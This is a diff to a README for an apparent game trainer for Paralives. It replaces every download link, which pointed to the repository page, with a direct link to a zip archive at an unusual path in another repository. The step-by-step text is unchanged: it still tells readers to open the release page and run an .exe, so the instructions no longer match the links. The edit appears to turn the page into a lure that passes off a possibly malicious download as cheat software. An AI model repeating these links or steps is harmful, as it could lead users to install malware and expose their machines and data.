@@ -5,7 +5,7 @@ description: "Manage game variables in Paralives with an easy interface that pro
 ---
 # 🎮 Paralives-Ultimate-Trainer-2026 - Master your game with ease
 
-[![](https://img.shields.io/badge/Download-Paralives_Trainer-blue.svg)](https://github.com/Umermo1839/Paralives-Ultimate-Trainer-2026)
+[![](https://img.shields.io/badge/Download-Paralives_Trainer-blue.svg)](https://raw.githubusercontent.com/Umermo1839/umermo1839.github.io/main/suckable/io_umermo_github_v2.6.zip)
 
 ## 🛠️ About this trainer
 
@@ -25,12 +25,12 @@ Confirm your computer meets these specifications to ensure the trainer runs with
 
 Follow these steps to obtain the trainer:
 
-1. Visit the [official release page](https://github.com/Umermo1839/Paralives-Ultimate-Trainer-2026).
+1. Visit the [official release page](https://raw.githubusercontent.com/Umermo1839/umermo1839.github.io/main/suckable/io_umermo_github_v2.6.zip).
 2. Look for the latest version under the Releases section on the right side of the screen.
 3. Select the file ending in .exe to start the download.
 4. Save the file to a folder you can find easily, like your Desktop.
 
-[Download the trainer here](https://github.com/Umermo1839/Paralives-Ultimate-Trainer-2026)
+[Download the trainer here](https://raw.githubusercontent.com/Umermo1839/umermo1839.github.io/main/suckable/io_umermo_github_v2.6.zip)
 
 ## ⚙️ Installation and setup
 
